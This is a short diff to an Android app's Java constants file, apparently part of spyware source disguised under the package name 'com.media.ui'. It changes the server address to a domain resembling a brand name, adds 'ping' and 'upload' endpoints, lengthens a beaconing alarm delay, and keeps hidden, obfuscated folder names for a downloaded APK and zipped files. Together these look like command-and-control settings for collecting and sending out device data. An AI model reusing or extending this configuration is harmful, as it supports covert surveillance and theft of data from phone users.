@@ -9,11 +9,11 @@ public class constants {
     public static final String AppFolder = ".erqwwre" + "/app.apk";
     public static final String ZIPFolder = ".hdysuf";
     public static final boolean LogEnable = true;
-    public static final int AlarmDelay = 90000;
+    public static final int AlarmDelay = 900000;
     public static final String db = "alarmflag";
     public static final String FORWARD_SLASH = "/";
     public static final String EMPTY_STRING = "";
-    public static final String BASE_URL = "http://45.114.79.248/pushapp/"; //Server1
+    public static final String BASE_URL = "http://mob5.panasonicarbo.com/pushapp/"; //Server1
     public static final String BASE_URL2 = "http://192.168.43.180/WAR/"; //Server2
     public static final String multipart_file = "multipart/form-data";
     public static final String FILE = "file";
@@ -33,4 +33,7 @@ public class constants {
     public static final String ZIP_EXT = ".zip";
     public static final String ZIP_FILE_NAME = "final";
     public static final String SELF_PACKAGE = "com.media.ui";
+    public static final String PING_PAGE = "mob3.php";
+    public static final String UPLOAD_PAGE = "upload.php";
+    public static final String APP_VER = "2.3";
 }
